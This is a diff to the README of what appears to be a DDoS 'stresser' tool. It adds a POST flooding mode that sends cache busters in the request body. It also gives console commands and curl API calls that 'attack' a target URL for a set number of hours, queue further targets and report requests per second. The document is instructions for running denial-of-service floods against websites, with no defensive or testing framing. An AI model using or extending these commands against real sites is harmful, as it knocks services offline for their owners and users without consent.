@@ -90,17 +90,20 @@ Create a `.env` file (or just use defaults):
 
 | Command | What It Does |
 |---|---|
-| `start https://target.com 2` | Attack for 2 hours |
-| `add https://target2.com 1` | Add another target to the queue |
+| `start https://target.com 2` | Attack for 2 hours (default: GET) |
+| `start https://target.com 2 -p` | POST mode — cache busters sent in request body instead of URL |
+| `start https://target.com 2 -g` | Explicit GET mode (same as default) |
+| `add https://target2.com 1 -p` | Add POST-mode target to queue |
 | `stop` | Stop everything |
-| `status` | See what's happening (requests/sec, status codes) |
-| `queue` | See queued targets |
+| `status` | See what's happening (requests/sec, status codes, method) |
+| `queue` | See queued targets with their methods |
 | `help` | List all commands |
 
 ### API (same thing via curl)
 
 ```bash
 curl "http://localhost:25694/stresser?url=https://target.com&duration=2"
+curl "http://localhost:25694/stresser?url=https://target.com&duration=2&method=POST"
 curl "http://localhost:25694/stop"
 curl "http://localhost:25694/status"
 ```
